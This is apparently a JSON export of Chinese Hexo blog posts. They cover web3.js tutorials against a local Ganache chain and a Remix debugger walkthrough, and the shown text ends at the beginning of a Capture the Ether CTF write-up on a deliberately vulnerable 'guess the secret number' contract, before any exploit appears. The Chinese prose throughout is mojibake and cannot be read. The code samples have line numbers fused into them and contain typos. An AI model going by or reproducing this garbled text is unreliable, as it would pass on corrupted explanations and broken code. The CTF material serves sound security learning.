è´¦æˆ·ä¸€ä¸€å¯¹åº”ï¼š æ–¹æ³•äºŒï¼šåµŒå…¥å¼è¿æ¥ â‘  æ·»åŠ ç½‘ç»œ â‘¡ å’Œ remix å»ºç«‹è¿æ¥ æ­¤æ—¶å½“å‰ç½‘ç»œé’±åŒ…æ²¡é’± â‘¢ é€šè¿‡ç§é’¥å¯¼å…¥æœ¬åœ°è´¦æˆ· â‘£ å¯¼å…¥æˆåŠŸä¹‹åï¼Œå°±å¯ä»¥åœ¨remix ä¸­åŒæ­¥è´¦æˆ·ä½™é¢ â‘¤ å¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼Œæ˜¯å¦èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œç»“æœæ˜¯ ok æ»´ â‘¥ åœ¨æœ¬åœ°å¯ä»¥æŸ¥çœ‹ remixéƒ¨ç½²çš„åˆçº¦ 7.2 å¤åˆ¶ABI å’Œ åœ°å€åˆ°ç¨‹åºä¸­ â‘  å¤åˆ¶ remix ä¸­çš„ ABI â‘¡ åˆ°ä»£ç ç¨‹åºä¸­ï¼Œå®šä¹‰ä¸€ä¸ªå˜é‡ var abi,å¹¶å°†å¤åˆ¶çš„ABI ä½œä¸ºå€¼ï¼Œèµ‹ç»™ abi â‘¢ åˆ°remix ä¸­æ‹·è´åœ°å€ï¼Œå¹¶èµ‹äºˆ æˆ‘ä»¬è‡ªå®šä¹‰çš„å˜é‡ var address 1var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;; â‘£ é€šè¿‡ ABI å’Œ åˆçº¦åœ°å€ å» åˆ›å»ºåˆçº¦å¯¹è±¡ 1var contract = new web.eth.Contract(abi,address); â‘¤ ç„¶åå°±æ˜¯æ˜¯ä¸€ç³»åˆ—çš„è°ƒç”¨æ“ä½œï¼ˆç›®å‰ä»£ç è¿˜ä¸æ˜¯å¾ˆæ‡‚ï¼‰ ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getNodeInfo().then(console.log);// web.eth.net.isListening().then(console.log);// web.bzz.net.isListening().then(console.log);// console.log(web.providers);// console.log(web);// console.log(Web3.modules);// console.log(Web3.version);// var web = new Web3(Web3.givenProvider || &quot;ws://localhost:8545&quot;);// console.log(web);var abi = [ &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;_number&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;name&quot;: &quot;setNumber&quot;, &quot;outputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;name&quot;: &quot;getNumber&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// éƒ¨ç½²å‡ºæ¥çš„åˆçº¦åœ°å€var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;;var contract = new web.eth.Contract(abi,address);function callBack1() &#123; console.log(&quot;callBack1() is running&quot;);&#125;function callBack2() &#123; console.log(&quot;callBack2() is running&quot;);&#125;var batch = new web.BatchRequest();// &quot;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&quot; æ˜¯å‡½æ•°è°ƒç”¨è€…çš„åœ°å€batch.add(web.eth.getBalance.request(&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;,&#x27;latest&#x27;,callBack1));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,callBack2));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,function(error,reusult)&#123; console.log(error); console.log(reusult);&#125;));batch.execute(); ç»“æœï¼š 8. å¤§æ•°æ®å¤„ç†ï¼ˆbigNumberï¼‰ã€‹ã€‹ã€‹å·¥å…·çš„æ–‡æ¡£åœ¨æ­¤å¤„8.1 ç®€ä»‹ æµ‹è¯•æ¡ˆä¾‹ï¼š 9. ä»¥å¤ªå•ä½è½¬æ¢9.1 web3.utils.fromWei æ³¨æ„ï¼šweb3.utils.fromWei(number,[unit])ä¸­çš„ number é€šå¸¸éƒ½æ˜¯ç”¨å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œå¦‚æœç›´æ¥æ˜¯æ•°å­—çš„è¯å°±ä¼šæŠ¥é”™ ç¤ºä¾‹ï¼š 9.2 web3.utils.toWei 9.3 web3.utils.toHex æ¼”ç¤ºï¼š tips: è¿˜å¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º 16è¿›åˆ¶ 9.4 web3.utils.hexToNumberString æ¼”ç¤ºç¤ºä¾‹ï¼š 9.5 è¿˜æœ‰ä¸€äº›å…¶ä»–çš„è½¬åŒ– 10. åœ°å€ç›¸å…³çš„æ“ä½œ10.1 web3.isAddress ***è§£è¯»ï¼šä¸ºä»€ä¹ˆç¬¬äº”æ¡ä»£ç æ‰§è¡Œçš„ç»“æœä¸º falseï¼Ÿ *** å¯ä»¥å‚è€ƒæˆ‘åŒå­¦çš„åšå®¢ï¼š[26.checksum of address | solidity life (levi104.com)](https://www.levi104.com/2023/04/02/03.solidityè¿›é˜¶/26.checksum of address&#x2F;) 11. æŸ¥è¯¢åŒºå—ä¿¡æ¯11.1 æŸ¥è¯¢æœ€æ–°çš„åŒºå—å·(åŒºå—é«˜åº¦)â€“web3.eth.getBlockNumber() 11.2 æŸ¥è¯¢æœ€æ–°åŒºå—â€“ we3.eth.getBlock() 11.3 æŸ¥è¯¢åŒºå—ä¸­çš„äº¤æ˜“ â€“ web3.eth.getTransactionFromBlock() web3_day0212. web3.js äº¤æ˜“æ“ä½œ12.1 è´¦æˆ·ç›¸å…³12.1.1 æŸ¥è¯¢è´¦æˆ·ä¸ªæ•° â€“ web3.eth.getAccount() 12.1.2 æŸ¥è¯¢è´¦æˆ·ä¸ªæ•° â€“ web3.eth.getAccounts() 12.1.3 æŸ¥è¯¢coinbase â€“ web3.eth.getCoinbase() 12.2 äº¤æ˜“ç›¸å…³12.2.1 æŸ¥è¯¢ä½™é¢ â€“ web3.eth.getBalance() 12.2.2 æŸ¥è¯¢å¹³å‡ gas ä»·æ ¼ 123web3.eth.getGasPrice().then((result) =&gt; &#123; console.log(&quot;wei: &quot; + result);&#125;) å¯èƒ½æ˜¯æˆ‘æ²¡å­¦è¿‡å‰ç«¯å§ï¼Œè¿™ä¸ªå†™æ³•å±å®è®©æˆ‘éœ‡æƒŠã€‚ã€‚ã€‚ã€‚ã€‚ 12.3 äº¤æ˜“æ‰§è¡Œç›¸å…³12.3.1 å‘é€äº¤æ˜“ â€“ web3.eth.sendTransaction() çªå‘å¥‡æƒ³ï¼Œè¯•è¯•èƒ½ä¸èƒ½ç»™æˆ‘å¦ä¸€ä¸ªè´¦æˆ·è½¬é’± ä»£ç ï¼š 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), data: &#x27;&#x27;&#125;web.eth.sendTransacation(transactionObject).then(console.log); from (æœ¬åœ°è´¦æˆ·)ï¼š to (é’±åŒ…åœ°å€)ï¼š ä½†æ˜¯æŠ¥é”™äº†ï¼Œå¦‚ä¸‹ï¼š å†å›å»çœ‹è§†é¢‘ï¼Œæ‰“å¼€å¼¹å¹•ï¼Œç›´æ¥ç‹ ç‹ æ„Ÿè°¢å¼¹å¹•è€å“¥ï¼ï¼ï¼ï¼ æ­£ç¡®ä»£ç ï¼šå°† data å­—æ®µåˆ æ‰ï¼Œæˆ–è€…æ³¨é‡Šæ‰ 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), // data: &#x27;&#x27;&#125;web.eth.sendTransaction(transactionObject).then(console.log); ä»£ç æ­£å¸¸è¿è¡Œï¼š åˆ°æˆ‘çš„é’±åŒ…å»æŸ¥çœ‹ä½™é¢ï¼Œå‘ç°è½¬è´¦æˆåŠŸï¼š 12.3.2 æŸ¥è¯¢äº¤æ˜“ä¿¡æ¯ â€” web3.eth.getTransaction() 12.3.3 æŸ¥è¯¢äº¤æ˜“æ”¶æ®ï¼ˆè¿›åŒºå—æ•°æ®ï¼‰ â€“ web3.eth.getTransactionReceipt() 13. web3.js åˆçº¦äº¤äº’ â€” æœ€æƒ³å­¦çš„åœ°æ–¹13.1 åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ¥å£(ABI)13.1.1 ABI ç®€ä»‹ 13.1.2 ABI èŒƒä¾‹ 13.1.3 ABIè¡¨ç°å½¢å¼ä¸¾ä¾‹ 13.1.4 ABI çš„ä½œç”¨ 13.2 åˆ›å»ºåˆçº¦13.2.1 å‡†å¤‡æ™ºèƒ½åˆçº¦ MyContract.sol: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MyContract &#123; //çŠ¶æ€å˜é‡ string storageVaule; //public çš„çŠ¶æ€å˜é‡ string public name; // æ„é€ å‡½æ•° constructor() public &#123; storageVaule = &quot;biyou&quot;; &#125; // ç»“æ„ä½“ struct Student &#123; string name; int age; &#125; // ä¿®æ”¹çŠ¶æ€å˜é‡ function setStorageValue(string memory str) public &#123; storageVaule = str; &#125; function getStorageValue() public view returns(string memory) &#123; return storageVaule; &#125; // å¯ä»¥å‘å¸çš„å‡½æ•° function setMoney() public payable &#123; &#125; // äº‹ä»¶ event myEvent (string name); function emitEvent(string memory name) public returns(string memory) &#123; emit myEvent(name); return strConcat(&quot;hello&quot;,name); &#125; function strConcat(string memory _a, string memory _b) internal pure returns(string memory) &#123; bytes memory _ba = bytes(_a); bytes memory _bb = bytes(_b); string memory ret = new string(_ba.length + _bb.length); bytes memory bret = bytes(ret); uint k = 0; for (uint i = 0; i &lt; _ba.length; i++) bret[k++] = _ba[i]; for (uint i = 0; i &lt; _bb.length; i++) bret[k++] = _bb[i]; return string(ret); &#125;&#125; 13.2.2 ç›´æ¥ä½¿ç”¨jsåœ¨åŒºå—é“¾ä¸Šéƒ¨ç½²ä¸€ä¸ªæ–°çš„æ™ºèƒ½åˆçº¦ï¼ˆï¼ï¼ï¼éš¾ç‚¹ï¼‰ æµ‹è¯•ä»£ç ï¼š 1234567891011121314151617181920212223let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs æ¨¡å—è¯»å–.solåˆçº¦æ–‡ä»¶var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var data = &quot;0x608060405234801561001057600080fd5b506040518060400160405280600581526020017f6269796f750000000000000000000000000000000000000000000000000000008152506000908051906020019061005c929190610062565b50610166565b82805461006e90610105565b90600052602060002090601f01602090048101928261009057600085556100d7565b82601f106100a957805160ff19168380011785556100d7565b828001600101855582156100d7579182015b828111156100d65782518255916020019190600101906100bb565b5b5090506100e491906100e8565b5090565b5b808211156101015760008160009055506001016100e9565b5090565b6000600282049050600182168061011d57607f821691505b6020821081141561013157610130610137565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b61095f806101756000396000f3fe60806040526004361061004a5760003560e01c806306fdde031461004f57806344e649b71461007a57806390ad7f5414610084578063982296a8146100af578063ec6070f6146100ec575b600080fd5b34801561005b57600080fd5b50610064610115565b60405161007191906106a9565b60405180910390f35b6100826101a3565b005b34801561009057600080fd5b506100996101a5565b6040516100a691906106a9565b60405180910390f35b3480156100bb57600080fd5b506100d660048036038101906100d1919061062f565b610237565b6040516100e391906106a9565b60405180910390f35b3480156100f857600080fd5b50610113600480360381019061010e919061062f565b6102b6565b005b60018054610122906107df565b80601f016020809104026020016040519081016040528092919081815260200182805461014e906107df565b801561019b5780601f106101705761010080835404028352916020019161019b565b820191906000526020600020905b81548152906001019060200180831161017e57829003601f168201915b505050505081565b565b6060600080546101b4906107df565b80601f01602080910402602001604051908101604052809291908181526020018280546101e0906107df565b801561022d5780601f106102025761010080835404028352916020019161022d565b820191906000526020600020905b81548152906001019060200180831161021057829003601f168201915b5050505050905090565b60607f52b54003f649c6d5ca97ae2b169c38f3c257eb14026ad745b11808153cdfd1528260405161026891906106a9565b60405180910390a16102af6040518060400160405280600581526020017f68656c6c6f000000000000000000000000000000000000000000000000000000815250836102d0565b9050919050565b80600090805190602001906102cc929190610524565b5050565b6060600083905060008390506000815183516102ec919061073d565b67ffffffffffffffff81111561032b577f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6040519080825280601f01601f19166020018201604052801561035d5781602001600182028036833780820191505090505b50905060008190506000805b855181101561043d578581815181106103ab577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b8383806103c290610842565b9450815181106103fb577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061043590610842565b915050610369565b5060005b845181101561051557848181518110610483577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602001015160f81c60f81b83838061049a90610842565b9450815181106104d3577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350808061050d90610842565b915050610441565b50829550505050505092915050565b828054610530906107df565b90600052602060002090601f0160209004810192826105525760008555610599565b82601f1061056b57805160ff1916838001178555610599565b82800160010185558215610599579182015b8281111561059857825182559160200191906001019061057d565b5b5090506105a691906105aa565b5090565b5b808211156105c35760008160009055506001016105ab565b5090565b60006105da6105d5846106f0565b6106cb565b9050828152602081018484840111156105f257600080fd5b6105fd84828561079d565b509392505050565b600082601f83011261061657600080fd5b81356106268482602086016105c7565b91505092915050565b60006020828403121561064157600080fd5b600082013567ffffffffffffffff81111561065b57600080fd5b61066784828501610605565b91505092915050565b600061067b82610721565b610685818561072c565b93506106958185602086016107ac565b61069e81610918565b840191505092915050565b600060208201905081810360008301526106c38184610670565b905092915050565b60006106d56106e6565b90506106e18282610811565b919050565b6000604051905090565b600067ffffffffffffffff82111561070b5761070a6108e9565b5b61071482610918565b9050602081019050919050565b600081519050919050565b600082825260208201905092915050565b600061074882610793565b915061075383610793565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156107885761078761088b565b5b828201905092915050565b6000819050919050565b82818337600083830152505050565b60005b838110156107ca5780820151818401526020810190506107af565b838111156107d9576000848401525b50505050565b600060028204905060018216806107f757607f821691505b6020821081141561080b5761080a6108ba565b5b50919050565b61081a82610918565b810181811067ffffffffffffffff82111715610839576108386108e9565b5b80604052505050565b600061084d82610793565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156108805761087f61088b565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000601f19601f830116905091905056fea2646970667358221220f839dcd300d8752d974808215c924e8e08a1d6556227d4be2b3c89805e41a38764736f6c63430008020033&quot;;myContract.deploy(&#123; data: data&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 1500000, gasPrice: &#x27;1000000&#x27;&#125;,function(error,result)&#123; console.log(result)&#125;)// var contractAddress = &quot;&quot;;// var myContract = new web.eth.Contract(myContractABI,contractAddress); æŠ¥é”™ï¼š åŸå› ï¼š\\ æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œå³è½¬ä¹‰å­—ç¬¦ï¼Œéœ€è¦ \\\\ è¿™æ ·è¡¨ç¤ºä¸€ä¸ª \\ æ‰§è¡Œç»“æœï¼š è¿™ä¸ªç»“æœæ˜¯ä¸æ­£ç¡®çš„ï¼Œæ²¡æœ‰ç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªåœ°å€ï¼Œè§£å†³åŠæ³•æ˜¯ï¼š å°† gasPrice å­—æ®µæ³¨é‡Šæ‰ï¼Œ å¦‚ // gasPrice: &#39;1000000&#39; å†æ¬¡æ‰§è¡Œå…¶ç»“æœä¸ºï¼š â‘  data æ¥æºï¼ˆéœ€è¦åœ¨å‰é¢åŠ ä¸€ä¸ª0xï¼‰ï¼š å¯ä»¥åœ¨ Ganache ä¸Šé¢æŸ¥åˆ° åœ¨vscode éƒ¨ç½²çš„åˆçº¦åœ°å€ï¼š ç”¨è¿™ä¸ªåˆçº¦åœ°å€åˆ°ï¼Œremix ä¸ŠéªŒè¯ä¸€ä¸‹ï¼š 13.3 è°ƒç”¨åˆçº¦å‡½æ•°13.3.1 è°ƒç”¨æ™ºèƒ½åˆçº¦è¯»å‡½æ•° ä»£ç ï¼š 1234567891011121314let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs æ¨¡å—è¯»å–.solåˆçº¦æ–‡ä»¶var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result);&#125;); ç»“æœï¼š 13.3.2 è°ƒç”¨æ™ºèƒ½åˆçº¦å†™å‡½æ•° ä»£ç ï¼š 12345678910111213141516171819let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs æ¨¡å—è¯»å–.solåˆçº¦æ–‡ä»¶var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var contractAddress = &quot;0x4c8BbD5829Bdcb9C9b11Ec3D5556cC77541FFB2e&quot;;var myContract = new web.eth.Contract(myContractABI,contractAddress);myContract.methods.setStorageValue(&quot;new message&quot;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;&#125;).on(&quot;receipt&quot;, function(result)&#123; console.log(result); myContract.methods.getStorageValue().call((err,result)=&gt;&#123; console.log(result); &#125;);&#125;); 13.4 è°ƒç”¨åˆçº¦äº‹ä»¶13.4.1 åˆçº¦äº‹ä»¶ç›‘å¬ 13.4.2 æ‰§è¡Œäº‹ä»¶æŸ¥è¯¢ 14. ç®€å•çš„DApp â€“ æŠ•ç¥¨ç³»ç»Ÿ","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Web3","slug":"Utils/Web3","permalink":"https://biyouqiuqiu.com/categories/Utils/Web3/"}],"tags":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"}]},{"title":"Remix-debugçš„ä½¿ç”¨","slug":"Basic_Knowledge/solidity/Remix-debugçš„ä½¿ç”¨","date":"2023-03-31T06:47:10.000Z","updated":"2023-03-31T06:47:10.000Z","comments":true,"path":"2023/03/31/Basic_Knowledge/solidity/Remix-debugçš„ä½¿ç”¨/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/31/Basic_Knowledge/solidity/Remix-debug%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Remix-debugçš„ä½¿ç”¨å‚è€ƒåšå®¢å®˜æ–¹æ–‡æ¡£1å®˜æ–¹æ–‡æ¡£21. å‚è€ƒåšå®¢ä¸­è·å–çš„æµ‹è¯•ä»£ç ï¼š1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Debugging &#123; uint256 counter; constructor(uint256 _counter) &#123; counter = _counter; &#125; function _setCounter(uint256 _counter) internal &#123; counter = _counter; &#125; function increment(uint256 value) public &#123; uint256 newValue = counter + value; _setCounter(newValue); &#125; function decrement(uint256 value) public &#123; uint256 newValue = counter - value; _setCounter(newValue); &#125; function getCounter() public view returns(uint256) &#123; return counter; &#125;&#125; 2. ç¼–è¯‘éƒ¨ç½² 3. è°ƒç”¨ increment å‡½æ•° 4. è°ƒè¯•æ™ºèƒ½åˆçº¦ 4.1 å…ˆæ‰¾åˆ°äº¤æ˜“çš„hashå€¼ï¼š0xe19af7a3be310b85ccfb9538ef16314a575f395aae3787f71f897b4845547885 4.2 å°†äº¤æ˜“çš„å“ˆå¸Œå¡«å…¥ï¼Œdebug çš„å‚æ•°æ¡†å†…ï¼Œç‚¹å‡» Start debugging 4.3 äº†è§£å„ä¸ªæŒ‰é’®çš„æ„æ€ â‘  è¿”å›åˆ°ä¸Šä¸€ä¸ªæ­¥éª¤ã€‚å‡½æ•°è°ƒç”¨å°†è¢«å¿½ç•¥ï¼Œè°ƒè¯•å™¨å°†ä¸è¿›å…¥è¯¥å‡½æ•°ã€‚ â‘¡ åé€€ä¸€æ­¥å›åˆ°ä¸Šä¸€æ­¥ã€‚å‡½æ•°ä¸ä¼šè¢«å¿½ç•¥ï¼Œè°ƒè¯•å™¨å°†è¿›å…¥è¯¥å‡½æ•°ã€‚ â‘¢ Step intoè¿›å…¥ä¸‹ä¸€æ­¥ï¼Œå¦‚æœæœ‰å‡½æ•°è°ƒç”¨ï¼Œè°ƒè¯•å™¨å°†è¿›å…¥å‡½æ•°ã€‚ â‘£ è·¨æ­¥å‰è¿›è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œä½†æ˜¯å‡½æ•°è°ƒç”¨å°†è¢«å¿½ç•¥ï¼Œè°ƒè¯•å™¨ä¸ä¼šè¿›å…¥å‡½æ•°ã€‚ â‘¤ è·³åˆ°ä¸Šä¸€ä¸ªæ–­ç‚¹ï¼Œä½¿è°ƒè¯•å™¨è¿›å…¥æœ€åè®¿é—®çš„æ–­ç‚¹ã€‚å¯ä»¥é€šè¿‡ç‚¹å‡»ä»£ç çš„è¡Œå·æ¥è®¾ç½®æ–­ç‚¹ â‘¥ è·³å‡ºå°†è°ƒè¯•å™¨å¸¦åˆ°å‡½æ•°çš„æœ«ç«¯ â‘¦ è·³åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ä¼šä½¿è°ƒè¯•å™¨è·³åˆ°ç¼–è¾‘å™¨ä¸­çš„ä¸‹ä¸€ä¸ªè®¾å®šçš„æ–­ç‚¹ã€‚ è¿˜æœ‰ä¸€ä¸ªæ˜¯æ»‘å—ï¼Œç±»ä¼¼äºè¿›åº¦æ¡ 4.4 åˆšå¼€å§‹è°ƒè¯•çš„æ—¶å€™ï¼Œincrement() å‡½æ•°ä½“ä¸­çš„æŸäº›å˜é‡æ˜¯é«˜äº®çš„ï¼Œæ¯”å¦‚newValue è¿™ä¸ªå˜é‡æ­£åœ¨è¢«åˆ›å»ºã€‚ä¸€ç›´å¾€ä¸‹è°ƒè¯•çš„æ—¶å€™ï¼Œcounter å’Œ value çš„ä¹Ÿä¼šé«˜äº®æ˜¾ç¤ºï¼Œæ¨¡æ‹Ÿäº†åŠ æ³•çš„å·¥ä½œæƒ…å†µ 4.5 æœ€ç»ˆï¼Œåœ¨åå‡ æ­¥ï¼Œ Solidity Locals é¢æ¿ä¸Šè¿™æ ·æ˜¾ç¤º è¿™æ„å‘³ç€ newValue å½“å‰çš„å€¼æ˜¯520ã€‚å†ç»§ç»­å¾€åèµ°, _setCounter å‡½æ•°å°†ä¼šé«˜äº®ï¼Œæ„å‘³ç€ æ§åˆ¶è¢«ä¼ é€’åˆ°å†…éƒ¨å‡½æ•° _setCounter ï¼Œæ­¤æ—¶ debug å°†ä¸èƒ½ç»§ç»­å¾€ä¸‹èµ°äº†ï¼Œè¡¨ç¤ºè¯¥æ–¹æ³•å·²ç»è¿è¡Œå®Œæˆ 4.6 å¯ä»¥è§‚å¯Ÿåˆ° Solidity State ä¸­çš„ counter çš„å€¼å·²ç»å‘ç”Ÿäº†æ›´æ–° 5. å…¶ä»–è°ƒè¯•åŠŸèƒ½5.1 å‡½æ•°æ ˆ è¿™ä¸ªé¢æ¿å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ï¼Œæ¯”å¦‚å“ªä¸ªå‡½æ•°ç›®å‰æ­£åœ¨æ‰§è¡Œï¼Œå“ªä¸ªå‡½æ•°è°ƒç”¨äº†å®ƒã€‚å¦‚æœæœ‰å¤šä¸ªå‡½æ•°ï¼Œå®ƒå°†ä»¥å †æ ˆçš„å½¢å¼æ˜¾ç¤ºã€‚ 5.2 å…¨å±€å˜é‡ å¯ä»¥è·Ÿè¸ªäº¤æ˜“ä¸­çš„å…¨å±€å˜é‡ï¼Œä»¥å¤‡ä½ éœ€è¦çŸ¥é“äº¤æ˜“ä¸­çš„å‘ä»¶äººæˆ–å…¶ä»–æ•°æ® 5.3 æ­¥éª¤ç»†èŠ‚ å¯ä»¥å¾—åˆ°ä¸€äº›é¢å¤–çš„æ­¥éª¤æ•°æ®ï¼Œå¦‚å·²ä½¿ç”¨çš„gas å’Œ å‰©ä½™çš„ gas 5.4 æ“ä½œç  ä½¿ç”¨æ“ä½œç ï¼Œå¯ä»¥å¾—åˆ°å…³äºåˆåŒå½“å‰æ­¥éª¤çš„é«˜çº§ä¿¡æ¯ã€‚ä½ å¯ä»¥äº†è§£ç¨‹åºä½•æ—¶æ‰§è¡Œæ­¥éª¤ï¼Œå¦‚ JUMP ï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼‰ã€‚ å†…å¿ƒï¼šæ­¤æ—¶çš„æˆ‘å†…å¿ƒè¿˜æ˜¯å¾ˆæ‡µé€¼çš„ï¼Œé“ç†éƒ½æ‡‚ï¼Œä½†æ˜¯å…¶ä¸­çš„ç»†èŠ‚è¿˜æ˜¯ä¸æ‡‚ï¼Œä¸ºä»€ä¹ˆä¸‹ä¸€æ­¥å¯ä»¥ç‚¹é‚£ä¹ˆé‚£ä¹ˆå¤šä¸‹ï¼Œä¹‹å‰å­¦ Java çš„æ—¶å€™ï¼Œä½¿ç”¨ Idea debugè°ƒè¯•ä»£ç ï¼Œå¥½åƒéƒ½ä¸éœ€è¦ç‚¹è¿™ä¹ˆå¤šä¸‹ï¼Œå¯èƒ½å¾—å¤šç”¨å§ï¼Œå¤šç»ƒå¤šç”¨","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"Remix-debug","slug":"Remix-debug","permalink":"https://biyouqiuqiu.com/tags/Remix-debug/"}]},{"title":"Guess the secret number","slug":"CTFS/capther the ether/Guess the secret number","date":"2023-03-20T04:47:10.000Z","updated":"2023-03-20T04:47:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Guess the secret number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Guess%20the%20secret%20number/","excerpt":"","text":"Guess the secret number1. é¢˜ç›® 1.1 Putting the answer in the code makes things a little too easy. This time Iâ€™ve only stored the hash of the number. Good luck reversing a cryptographic hash! 1.2 é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123; bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function GuessTheSecretNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (keccak256(n) == answerHash) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 